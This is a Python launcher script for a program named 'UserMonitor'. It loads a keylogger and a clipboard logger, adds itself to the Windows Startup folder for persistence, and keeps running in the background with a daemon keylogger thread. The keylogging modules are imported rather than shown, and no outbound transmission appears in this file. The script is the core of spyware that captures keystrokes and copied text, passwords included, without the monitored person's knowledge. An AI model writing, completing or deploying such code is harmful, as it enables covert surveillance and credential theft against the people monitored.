import os
import threading
import logging
import sys
import time

# Setup logging
def setup_logging():
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))

    log_file = os.path.join(base_dir, 'debug.log')

    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file, encoding='utf-8')
        ]
    )

setup_logging()
logging.info("=== APPLICATION START ===")

# Fix paths for imports
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Добавляем папку src в sys.path
src_path = os.path.join(BASE_DIR, 'src')
if src_path not in sys.path:
    sys.path.insert(0, src_path)

# Import modules
try:
    from core.clipboard_logger import start_clipboard_logger
    logging.debug("Clipboard logger imported")
except ImportError as e:
    logging.error(f"Clipboard logger import failed: {e}")
    # Fallback: попытка прямого импорта
    try:
        import sys
        sys.path.append(os.path.join(BASE_DIR, 'src', 'core'))
        from clipboard_logger import start_clipboard_logger
        logging.debug("Clipboard logger imported (fallback)")
    except ImportError:
        logging.error("Clipboard logger import completely failed")
        start_clipboard_logger = None

try:
    from core.process_logs import process_all_logs
    logging.debug("Process logs imported")
except ImportError as e:
    logging.error(f"Process logs import failed: {e}")
    try:
        sys.path.append(os.path.join(BASE_DIR, 'src', 'core'))
        from process_logs import process_all_logs
        logging.debug("Process logs imported (fallback)")
    except ImportError:
        logging.error("Process logs import completely failed")
        process_all_logs = None

try:
    from core.keylogger import start_keylogger
    logging.debug("Keylogger imported")
except ImportError as e:
    logging.error(f"Keylogger import failed: {e}")
    try:
        sys.path.append(os.path.join(BASE_DIR, 'src', 'core'))
        from keylogger import start_keylogger
        logging.debug("Keylogger imported (fallback)")
    except ImportError:
        logging.error("Keylogger import completely failed")
        start_keylogger = None

try:
    from utils.add_to_autostart import add_to_autostart
    logging.debug("Autostart imported")
except ImportError as e:
    logging.error(f"Autostart import failed: {e}")
    try:
        sys.path.append(os.path.join(BASE_DIR, 'src', 'utils'))
        from add_to_autostart import add_to_autostart
        logging.debug("Autostart imported (fallback)")
    except ImportError:
        logging.error("Autostart import completely failed")
        add_to_autostart = None

# Autostart setup
try:
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_dir, "UserMonitor.lnk")

    if not os.path.exists(shortcut_path) and add_to_autostart:
        if getattr(sys, 'frozen', False):
            target_path = sys.executable
        else:
            target_path = os.path.join(BASE_DIR, 'run_all.py')
        add_to_autostart(target_path, "UserMonitor")
        logging.debug("Added to autostart")
except Exception as e:
    logging.error(f"Autostart setup failed: {e}")

def main():
    logging.info("Starting UserMonitor...")

    # Create logs directory
    try:
        logs_dir = os.path.join(BASE_DIR, 'logs')
        os.makedirs(logs_dir, exist_ok=True)
        logging.debug(f"Logs directory: {logs_dir}")
    except Exception as e:
        logging.error(f"Failed to create logs directory: {e}")

    # Process old logs
    try:
        if process_all_logs:
            process_all_logs()
            logging.debug("Log processing completed")
        else:
            logging.error("process_all_logs function is not available")
    except Exception as e:
        logging.error(f"Log processing failed: {e}")

    # Start clipboard monitor
    try:
        if start_clipboard_logger:
            start_clipboard_logger()
            logging.debug("Clipboard logger started")
        else:
            logging.error("start_clipboard_logger function is not available")
    except Exception as e:
        logging.error(f"Clipboard logger failed: {e}")

    # Start keylogger in separate thread
    def run_keylogger_wrapper():
        try:
            if start_keylogger:
                logging.debug("Starting keylogger...")
                start_keylogger()
            else:
                logging.error("start_keylogger function is not available")
        except Exception as e:
            logging.error(f"Keylogger failed: {e}")

    if start_keylogger:
        keylogger_thread = threading.Thread(target=run_keylogger_wrapper, daemon=True)
        keylogger_thread.start()
        logging.debug("Keylogger thread started")
    else:
        logging.error("Cannot start keylogger thread - function not available")

    # Keep main thread alive
    try:
        logging.info("Application running in background...")
        while True:
            time.sleep(10)  # Sleep longer to reduce CPU usage
    except KeyboardInterrupt:
        logging.info("Application stopped by user")
    except Exception as e:
        logging.error(f"Main loop error: {e}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.exception("Fatal error in main")
        print(f"Ошибка: {e}")